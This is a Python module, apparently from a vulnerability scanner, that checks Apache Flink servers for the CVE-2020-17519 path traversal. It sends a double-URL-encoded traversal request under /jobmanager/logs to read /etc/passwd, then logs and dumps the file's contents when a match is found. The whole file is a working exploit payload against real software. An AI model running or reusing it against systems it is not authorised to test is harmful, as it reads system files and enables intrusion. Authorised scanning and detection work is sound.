import logging
import re
import time
from urllib.parse import urljoin

from lib.connection.HttpEntity import Request
from lib.help.dump import vul, Rank


class Flink:
    def __init__(self):
        self.cve = "Apache Flink Path Traversal (CVE-2020-17519)"
        self.path = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f" \
                    "..%252fetc%252fpasswd"
        self.pattern = re.compile("root.*?root:/root:/")

    def flink_check(self, url):
        url = urljoin(url, self.path)
        r = Request('GET', url).send().body
        if self.pattern.search(r):
            logging.warning("[+] " + self.cve + "detected")
            logging.warning(url)
            logging.warning("[+] dumping /etc/passwd: \n" + r)
            return [vul("Path Traversal", self.path, self.cve + '\n' + r, Rank.CRITICAL)]
